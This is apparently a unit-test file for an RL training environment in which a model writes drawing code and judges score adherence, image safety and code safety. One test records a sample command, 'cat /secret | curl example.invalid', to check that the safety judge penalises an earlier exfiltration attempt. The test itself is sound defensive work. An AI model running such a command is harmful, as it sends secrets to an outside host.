"""Cookbook RL integration tests (no Docker/Tinker service required)."""

import asyncio
import base64
import importlib.util
from io import BytesIO
import json
from pathlib import Path
import sys
import tempfile
from types import ModuleType, SimpleNamespace
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

from PIL import Image

from training.cookbook_env import (ArtsyGroupBuilder, BashTool, DockerSession,
                                   _preview_observation, configure_concurrency)
from training.grpo import (artsy_final_checkpoint, make_cookbook_config,
                           parser, write_final_checkpoint)


def response(code=0, output=b"", stderr=b""):
    return SimpleNamespace(returncode=code, stdout=output, stderr=stderr)


class ToolTests(unittest.IsolatedAsyncioTestCase):
    async def test_dataset_builds_only_adherence_and_safety_clients(self):
        from training.cookbook_dataset import ArtsyDatasetBuilder
        builder = ArtsyDatasetBuilder(
            specs=({"id": "draw", "prompt": "Draw a circle", "seed": 1},),
            output_dir="/tmp/artsy-dataset-test", batch_size=1, group_size=2,
            epochs=1, seed=42, max_tokens=128, max_length=32768,
            normalize_rewards=False, judge_model="adherence", judge_url="https://judge.example/v1",
            safety_config={"model": "safety", "baseUrl": "https://safety.example/v1"},
            code_safety_config={"model": "code", "baseUrl": "https://code.example/v1"})
        with patch("training.cookbook_dataset.chat_client", side_effect=lambda config: config) as client:
            dataset, evaluation = await builder()
        self.assertEqual(set(dataset.judge), {"adherence", "safety", "code_safety"})
        self.assertEqual(client.call_count, 3)
        self.assertIsNone(evaluation)

    async def test_submit_is_the_only_terminating_bash_command(self):
        configure_concurrency(2)
        spec = {"id": "draw", "prompt": "Draw a circle", "seed": 42}
        with tempfile.TemporaryDirectory() as root:
            session = DockerSession(spec, Path(root), MagicMock())
            tool = BashTool(session)

            async def docker(argv, **kwargs):
                if argv[0] == "run":
                    return response(output=b"id")
                if argv[0] == "exec":
                    return response(output=b"ok")
                return response()

            tools_module = ModuleType("tinker_cookbook.tool_use.tools")
            tools_module.simple_tool_result = lambda content, **kw: SimpleNamespace(
                should_stop=kw.get("should_stop", False),
                messages=[{"content": content, "tool_call_id": kw["call_id"]}])
            tools_module.error_tool_result = tools_module.simple_tool_result
            with patch("training.cookbook_env._docker", new=AsyncMock(side_effect=docker)), \
                 patch.dict(sys.modules, {"tinker_cookbook": ModuleType("tinker_cookbook"),
                     "tinker_cookbook.tool_use": ModuleType("tinker_cookbook.tool_use"),
                     "tinker_cookbook.tool_use.tools": tools_module}):
                result = await tool.run(SimpleNamespace(
                    arguments={"command": "echo hello"}, call_id="first"))
                self.assertFalse(result.should_stop)
                self.assertEqual(result.messages[0]["tool_call_id"], "first")
                submitted = await tool.run(SimpleNamespace(
                    arguments={"command": "echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT"},
                    call_id="second"))
                self.assertTrue(submitted.should_stop)
                self.assertEqual(session.commands, [
                    "echo hello", "echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT"])
                await session.close()
            self.assertIsNone(session.container)

    async def test_adherence_rewards_adjust_existing_totals_without_visual_scoring(self):
        spec = {"id": "draw", "prompt": "Draw a circle", "seed": 1}
        judge = {"visual": SimpleNamespace(compare=AsyncMock(side_effect=["A", "B"]))}
        with tempfile.TemporaryDirectory() as root:
            builder = ArtsyGroupBuilder(spec, 2, 1, Path(root), judge, 128, 32768, False)
            for index in range(2):
                session = DockerSession(spec, Path(root) / str(index), judge)
                session.submitted = True
                session.png = b"image" + bytes([index])
                session.result = {"unsafe": False, "scores": {"render_valid": 1.0, "adherence": (index + 1) / 4}}
                builder.sessions.append(session)
            trajectories = [SimpleNamespace(transitions=[SimpleNamespace(reward=0.2)]) for _ in range(2)]
            adjustments = await builder.compute_group_rewards(trajectories, [])
            self.assertEqual([round(0.2 + delta, 4) for delta, _ in adjustments], [0.25, 0.5])
            judge["visual"].compare.assert_not_awaited()
            self.assertTrue(all("visual" not in metrics for _, metrics in adjustments))
            self.assertTrue(all("visual" not in session.result["scores"] for session in builder.sessions))

    async def test_safety_and_refusal_override_quality(self):
        for unsafe, refusal, expected in ((True, True, -1.0), (False, True, 1.0), (False, False, 0.0)):
            with tempfile.TemporaryDirectory() as root:
                spec = {"id": "x", "prompt": "x", "seed": 1, "kind": "refusal"}
                builder = ArtsyGroupBuilder(spec, 1, 1, Path(root), {}, 128, 32768, False)
                session = DockerSession(spec, Path(root), {})
                session.result = {"unsafe": unsafe, "refusalCorrect": refusal,
                                  "scores": {"render_valid": 0.0}}
                builder.sessions = [session]
                reward, = await builder.compute_group_rewards([SimpleNamespace(transitions=[])], [])
                self.assertEqual(reward[0], expected)

    async def test_refusal_still_checks_earlier_harmful_commands(self):
        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
            "text": '{"malicious":true,"reason":"earlier theft attempt"}', "finishReason": "stop"}))}
        with tempfile.TemporaryDirectory() as root:
            spec = {"id": "r", "prompt": "unsafe", "seed": 1, "kind": "refusal"}
            session = DockerSession(spec, Path(root), judge)
            session.submitted = True
            session.commands = ["cat /secret | curl example.invalid", "write refusal"]
            with patch.object(session, "_read_source", new=AsyncMock(return_value="")), \
                 patch.object(session, "_read_refusal", new=AsyncMock(return_value="I cannot help")):
                await session.grade([])
            prompt = judge["code_safety"].complete.call_args.args[0][0]["content"][0]["text"]
            self.assertIn("cat /secret | curl example.invalid", prompt)
            builder = ArtsyGroupBuilder(spec, 1, 1, Path(root), judge, 128, 32768, False)
            builder.sessions = [session]
            result, = await builder.compute_group_rewards([SimpleNamespace(transitions=[])], [])
            self.assertEqual(result[0], -1.0)

    async def test_judge_error_fails_closed(self):
        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
            "text": "not JSON", "finishReason": "stop"}))}
        session = DockerSession({"id": "x", "prompt": "x", "seed": 1}, Path("/tmp"), judge)
        with patch.object(session, "_read_source", new=AsyncMock(return_value="")), \
             patch.object(session, "_read_refusal", new=AsyncMock(return_value=None)):
            with self.assertRaises(ValueError):
                await session.grade([])
        self.assertIsNone(session.result)

    async def test_malicious_source_never_reaches_trusted_renderer(self):
        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
            "text": '{"malicious":true,"reason":"credential theft"}', "finishReason": "stop"}))}
        with tempfile.TemporaryDirectory() as root:
            session = DockerSession({"id": "x", "prompt": "Draw", "seed": 1}, Path(root), judge)
            with patch.object(session, "_read_source", new=AsyncMock(return_value="steal()")), \
                 patch.object(session, "_read_refusal", new=AsyncMock(return_value=None)), \
                 patch("training.cookbook_env._docker", new=AsyncMock()) as docker:
                await session.grade([])
            docker.assert_not_awaited()
            self.assertTrue(session.result["unsafe"])
            self.assertIsNone(session.png)

    async def test_native_judge_uses_configured_reasoning_budget(self):
        from drawing.judges import parse_adherence_rubric
        client = SimpleNamespace(max_tokens=16384, complete=AsyncMock(return_value={
            "text": '{"score":4,"reason":"All requested elements"}', "finishReason": "stop"}))
        session = DockerSession({}, Path("/tmp"), {"adherence": client})
        result = await session._judge("adherence", "Grade", parse_adherence_rubric)
        self.assertEqual(result["score"], 4)
        self.assertEqual(client.complete.call_args.args[1], 16384)

    async def test_unsubmitted_image_gets_zero_reward_without_visual_judge(self):
        spec = {"id": "x", "prompt": "Draw", "seed": 1}
        judge = {"visual": SimpleNamespace(compare=AsyncMock(return_value="Tie"))}
        with tempfile.TemporaryDirectory() as root:
            builder = ArtsyGroupBuilder(spec, 2, 1, Path(root), judge, 128, 32768, False)
            for index in range(2):
                session = DockerSession(spec, Path(root) / str(index), judge)
                session.submitted = index == 0
                session.png = b"image"
                session.result = {"unsafe": False, "scores": {"render_valid": 1., "adherence": 1.}}
                builder.sessions.append(session)
            adjustments = await builder.compute_group_rewards(
                [SimpleNamespace(transitions=[]) for _ in range(2)], [])
            self.assertEqual([reward for reward, _ in adjustments], [1., 0.])
            judge["visual"].compare.assert_not_awaited()

    async def test_fresh_trusted_render_and_correctness_grading(self):
        spec = {"id": "draw", "prompt": "Draw a circle", "seed": 1}
        png_file = BytesIO()
        Image.new("RGB", (1920, 1200)).save(png_file, "PNG")
        png = png_file.getvalue()
        judge = {role: SimpleNamespace(complete=AsyncMock(return_value={
            "text": json.dumps(value), "finishReason": "stop"})) for role, value in (
                ("adherence", {"score": 3, "reason": "Looks right"}),
                ("safety", {"harmful": False, "reason": "Safe image"}),
                ("code_safety", {"malicious": False, "reason": "Safe code"}))}
        with tempfile.TemporaryDirectory() as root:
            session = DockerSession(spec, Path(root), judge)
            session.container = "fake-container"

            async def docker(argv, **kwargs):
                if argv[0] == "exec" and "refusal.json" in argv[-1]:
                    return response()
                if argv[0] == "exec":
                    return response(output=b"print('draw')\n")
                if argv[0] == "run":
                    self.assertIn("/opt/artsy/score_rl.py", argv)
                    self.assertEqual(kwargs["stdin"], b"print('draw')\n")
                    return response(output=json.dumps({
                        "feedback": {"ok": True}, "image": base64.b64encode(png).decode()
                    }).encode())
                return response()

            with patch("training.cookbook_env._docker", new=AsyncMock(side_effect=docker)):
                reward, metrics = await session.grade([])
            self.assertEqual(reward, 0.0)
            self.assertEqual(metrics["render_valid"], 1.0)
            self.assertEqual((Path(root) / "image.png").read_bytes(), png)
            self.assertEqual(json.loads((Path(root) / "result.json").read_text())
                             ["scores"]["adherence"], 0.75)


class PreviewTests(unittest.TestCase):
    def test_png_preview_becomes_image_part_with_feedback(self):
        output = BytesIO()
        Image.new("RGB", (24, 16), "navy").save(output, "PNG")
        encoded = base64.b64encode(output.getvalue()).decode()
        marker = ("<MSWEA_MULTIMODAL_CONTENT><CONTENT_TYPE>image_url</CONTENT_TYPE>"
                  f"data:image/png;base64,{encoded}</MSWEA_MULTIMODAL_CONTENT>")
        payload = (json.dumps({"ok": True, "sourceHash": "f" * 64}) + "\n" + marker).encode()
        resize = ModuleType("transformers.models.qwen2_vl.image_processing_qwen2_vl")
        resize.smart_resize = lambda height, width, **kwargs: (height, width)
        modules = {name: ModuleType(name) for name in (
            "transformers", "transformers.models", "transformers.models.qwen2_vl")}
        modules[resize.__name__] = resize
        with patch.dict(sys.modules, modules), patch("training.cookbook_env.encoder") as get_encoder:
            get_encoder.return_value.image_processor.patch_size = 14
            get_encoder.return_value.image_processor.merge_size = 2
            parts, feedback = _preview_observation(payload, b"", 0)
        self.assertEqual(feedback["sourceHash"], "f" * 64)
        self.assertEqual([part["type"] for part in parts], ["text", "image"])
        self.assertEqual(parts[1]["image"].size, (24, 16))
        self.assertNotIn("data:image/png", parts[0]["text"])

    def test_text_feedback_without_preview(self):
        observation, feedback = _preview_observation(b'{"ok":false}\n', b"SyntaxError", 1)
        self.assertIn("Return code: 1", observation)
        self.assertIn("SyntaxError", observation)
        self.assertIsNone(feedback)

    def test_invalid_image_payload_is_rejected(self):
        marker = ("<MSWEA_MULTIMODAL_CONTENT><CONTENT_TYPE>image_url</CONTENT_TYPE>"
                  "data:image/png;base64,AAAA</MSWEA_MULTIMODAL_CONTENT>")
        # The renderer's marker is not arbitrary text or a valid PNG.
        with self.assertRaises(ValueError):
            _preview_observation(marker.encode(), b"", 0)


class ConfigurationTests(unittest.TestCase):
    def test_recover_final_json_without_rerunning_training(self):
        record = SimpleNamespace(name="final", final=None, batch=1,
                                 state_path="tinker://run/weights/final",
                                 sampler_path="tinker://run/sampler_weights/final")
        package = ModuleType("tinker_cookbook")
        package.checkpoint_utils = SimpleNamespace(get_last_checkpoint=lambda _: record)
        plan = {"algorithm": "tinker-cookbook-ppo-v1", "model": "Qwen/Qwen3.5-4B"}
        with tempfile.TemporaryDirectory() as root, patch.dict(
                sys.modules, {"tinker_cookbook": package}):
            output_dir = Path(root)
            result = write_final_checkpoint(output_dir, plan)
            self.assertEqual(json.loads((output_dir / "final.json").read_text()), result)
            self.assertEqual(write_final_checkpoint(output_dir, plan), result)
            with self.assertRaisesRegex(ValueError, "incompatible final.json"):
                write_final_checkpoint(output_dir, {**plan, "model": "other"})
            self.assertEqual(json.loads((output_dir / "final.json").read_text()), result)

    def test_cookbook_final_record_does_not_require_optional_final_flag(self):
        record = SimpleNamespace(name="final", final=None, batch=1,
                                 state_path="tinker://run/weights/final",
                                 sampler_path="tinker://run/sampler_weights/final")
        plan = {"model": "Qwen/Qwen3.5-4B"}
        result = artsy_final_checkpoint(record, plan)
        self.assertEqual(result["step"], 1)
        self.assertEqual(result["sampler_path"], record.sampler_path)
        self.assertIs(result["config"], plan)
        with self.assertRaisesRegex(RuntimeError, "final state"):
            artsy_final_checkpoint(SimpleNamespace(
                name="step-000001", batch=1, state_path=record.state_path,
                sampler_path=record.sampler_path), plan)

    def test_defaults_match_existing_agent_protocol(self):
        args = parser().parse_args([])
        self.assertEqual(args.group_size, 4)
        self.assertEqual(args.max_samples, 4)
        self.assertEqual(args.max_tokens, 8192)
        self.assertEqual(args.max_length, 262144)

    @unittest.skipUnless(importlib.util.find_spec("tinker_cookbook"),
                         "Install the pinned training dependencies")
    def test_cookbook_uses_ppo_kl_and_dpo_initialization(self):
        args = parser().parse_args(["--max-steps", "1", "--clip-epsilon", "0.1"])
        args.output_dir = Path("/tmp/artsy-rl-example")
        plan = {"initial_state_path": "tinker://initial",
                "reference_sampler_path": "tinker://reference",
                "lora_rank": 32, "correctness_judge_model": "judge",
                "correctness_judge_url": "https://judge.example/v1",
                "safety_config": {}, "code_safety_config": {}}
        config = make_cookbook_config(
            args, [{"id": "a", "prompt": "Draw a circle", "seed": 1}], plan, 1)
        self.assertEqual(config.loss_fn, "ppo")
        self.assertEqual(config.loss_fn_config["clip_low_threshold"], 0.9)
        self.assertEqual(config.loss_fn_config["clip_high_threshold"], 1.1)
        self.assertEqual(config.load_checkpoint_path, "tinker://initial")
        self.assertEqual(config.kl_reference_config.load_checkpoint_path, "tinker://reference")
        self.assertEqual(config.max_tokens, 8192)
        self.assertTrue(config.termination.zero_reward_on_limit)


class NativeContextTests(unittest.IsolatedAsyncioTestCase):
    async def test_real_cookbook_runner_accepts_long_prompt_and_clips_near_context(self):
        import tinker
        from tinker_cookbook.completers import TokensWithLogprobs
        from tinker_cookbook.rl.rollouts import do_single_rollout
        from drawing.config import MODEL_CONTEXT_WINDOW
        for length, expected in ((40000, 8192), (MODEL_CONTEXT_WINDOW - 13, 13)):
            renderer = MagicMock()
            renderer.get_stop_sequences.return_value = [2]
            renderer.build_generation_prompt.return_value = tinker.ModelInput.from_ints([1] * length)
            builder = ArtsyGroupBuilder({'id': 'x', 'prompt': 'disk', 'seed': 1},
                                       1, 1, Path('/tmp'), MagicMock(),
                                       8192, MODEL_CONTEXT_WINDOW, False)
            calls = []

            async def policy(observation, stop, *, max_tokens=None):
                calls.append((observation.length, max_tokens))
                return TokensWithLogprobs([1] * max_tokens, [0.] * max_tokens, 'length')

            with patch('training.cookbook_env.encoder', return_value=SimpleNamespace(renderer=renderer)), \
                 patch('training.cookbook_env.initial_messages', return_value=[]):
                env, = await builder.make_envs()
                self.assertIsNone(env.max_generation_tokens)
                self.assertIsNone(env.rollout_limits.max_sampled_tokens)
                await do_single_rollout(policy, env)
            self.assertEqual(calls, [(length, expected)])


class ToolBudgetTests(unittest.IsolatedAsyncioTestCase):
    async def test_training_stops_at_twenty_calls_and_blocks_more_commands(self):
        from training.cookbook_env import DockerSession
        with tempfile.TemporaryDirectory() as root:
            session = DockerSession({'prompt': 'Draw a disk', 'seed': 1}, Path(root), {})
            session.container = 'fake-container'
            reply = SimpleNamespace(stdout=b'', stderr=b'', returncode=0)
            with patch('training.cookbook_env._docker', new=AsyncMock(return_value=reply)) as docker:
                for index in range(20):
                    _, done = await session.execute('true')
                    self.assertEqual(done, index == 19)
                observation, done = await session.execute('true')
                self.assertTrue(done)
                self.assertIn('budget exhausted', observation)
                self.assertEqual(docker.await_count, 20)
                self.assertFalse(session.submitted)


class RolloutPromptTests(unittest.TestCase):
    def test_initial_messages_describe_turn_limit_without_aggregate_token_limit(self):
        from training.cookbook_env import initial_messages
        renderer = SimpleNamespace(create_conversation_prefix_with_tools=lambda *a, **k: [])
        with patch('training.cookbook_env.encoder', return_value=SimpleNamespace(renderer=renderer)):
            messages = initial_messages({'prompt': 'Draw a disk', 'seed': 1}, [])
        content = messages[-1]['content']
        self.assertIn('20 model turns', content)
        self.assertNotIn('32768', content)
        self.assertNotIn('total input and output', content)


if __name__ == "__main__":
    unittest.main()
